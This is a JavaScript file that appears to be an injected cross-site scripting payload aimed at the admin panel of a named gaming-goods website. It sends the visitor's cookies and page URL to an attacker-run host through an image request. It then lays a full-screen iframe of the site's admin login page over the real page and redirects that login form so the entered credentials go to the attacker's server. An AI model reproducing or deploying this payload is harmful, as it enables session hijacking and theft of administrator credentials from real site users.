//Debugging purposes
if(window.location.pathname != "/membernorders.html"){
	throw new Error();
}

//Gen data
cookie = "Cookies:"+document.cookie;
url = "URL:"+document.location;

$data = encodeURIComponent(cookie+url);

var imageObject = new Image();
imageObject.src = "http://g4wowisbad.000webhostapp.com/log.php?log="+$data;

//Passwords
//--------------------------------


//Load jquery
var script = document.createElement('script');
script.src = '//code.jquery.com/jquery-1.11.0.min.js';
script.type = 'text/javascript';
document.getElementsByTagName('head')[0].appendChild(script);

//Let page load first
document.head.innerHTML = "<style>#login_iframe{width:100%;height:100%;border:none;position:absolute;left:0;top:0;overflow:hidden;z-index:1000000000000000;}</style>" + document.head.innerHTML;
document.body.innerHTML = "<iframe scrolling='no' onload=\"this.style.background='#222 url(\'images/bg-login.gif\')'\" id='login_iframe' src='https://www.g4wow.com/admin_g4wow/Login.aspx'></iframe>" + document.body.innerHTML;
var prevTitle = document.title;
document.title = "网站管理系统";

$("#login_iframe").ready(function(){
	//alert("Loaded");
	$("#login_iframe").contents().find("#form1").attr("action", "http://g4wowisbad.000webhostapp.com/login.php");
	$("#login_iframe").contents().find("#txtUsername").val(getCookie("login_name"));
	$("#login_iframe").contents().find("#form1").submit(function(){
		$("#login_iframe").attr("src", "https://www.g4wow.com/admin_g4wow/Login.aspx");
		$("#login_iframe").delay(1000).hide(0);
	});
};

function getCookie(cname) {
    var name = cname + "=";
    var ca = document.cookie.split(';');
    for(var i = 0; i <ca.length; i++) {
        var c = ca[i];
        while (c.charAt(0) == ' ') {
            c = c.substring(1);
        }
        if (c.indexOf(name) == 0) {
            return c.substring(name.length, c.length);
        }
    }
    return "";
}